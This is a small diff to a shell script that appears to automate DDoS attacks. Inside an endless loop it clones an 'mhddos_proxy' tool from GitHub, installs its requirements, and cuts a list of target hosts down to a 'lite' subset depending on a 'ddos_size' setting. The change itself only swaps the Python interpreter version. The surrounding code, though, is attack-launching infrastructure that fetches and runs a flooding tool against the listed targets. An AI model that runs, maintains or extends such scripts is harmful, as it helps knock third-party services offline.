@@ -131,7 +131,7 @@ while true; do
     cd ~/multidd/
     git clone https://github.com/LordWarWar/mhddos_proxy.git
     cd ~/multidd/mhddos_proxy
-    python3.8 -m pip install -r requirements.txt
+    python3 -m pip install -r requirements.txt
 
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
